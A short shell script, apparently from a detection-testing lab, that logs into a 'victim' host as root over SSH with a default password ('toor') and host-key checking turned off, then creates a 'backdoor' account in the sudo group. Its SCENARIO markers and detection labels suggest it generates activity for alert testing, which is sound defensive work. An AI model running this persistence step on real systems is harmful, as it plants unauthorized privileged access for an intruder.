#!/bin/sh
# local-account-created, privileged-group-change, backdoor-account: as
# root, create a fresh account and add it to the sudo group. Idempotent:
# removes the account first if a previous run left it behind.
set -eu
VICTIM="${VICTIM_HOST:-victim}"
ROOT_PASS="${ROOT_PASSWORD:-toor}"
SSH="sshpass -p $ROOT_PASS ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@$VICTIM"
echo "SCENARIO_START persistence $(date -u +%Y-%m-%dT%H:%M:%SZ)"

$SSH 'userdel -r backdoor 2>/dev/null; useradd -m backdoor && usermod -aG sudo backdoor'

echo "SCENARIO_END persistence"
